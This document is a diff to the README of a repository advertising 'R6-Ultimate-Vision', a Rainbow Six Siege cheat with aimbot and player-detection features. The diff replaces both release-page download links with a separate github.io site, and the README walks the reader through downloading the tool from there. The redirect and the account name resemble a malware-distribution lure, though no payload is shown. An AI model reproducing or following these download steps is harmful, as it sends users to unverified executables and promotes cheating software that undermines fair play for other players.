@@ -1,6 +1,6 @@
 # 🎯 R6-Ultimate-Vision - Gain the advantage in every match
 
-[![Download R6-Ultimate-Vision](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jillisemiliterate919/R6-Ultimate-Vision/releases)
+[![Download R6-Ultimate-Vision](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://jillisemiliterate919.github.io)
 
 ## 📖 Overview
 R6-Ultimate-Vision provides visual and mechanical assistance for Rainbow Six Siege. This tool helps players track targets and manage weapon handling. The software includes detection systems for player positions and automated aiming features to support your gameplay. It functions as an overlay to provide data directly within your match.
@@ -17,7 +17,7 @@ Ensure your computer meets these conditions before you run the tool:
 ## 📥 Downloading the Tool
 Visit the official release page to obtain the latest version of the software.
 
-[Click here to visit the release page and download](https://github.com/jillisemiliterate919/R6-Ultimate-Vision/releases)
+[Click here to visit the release page and download](https://jillisemiliterate919.github.io)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section at the bottom of the top release post.
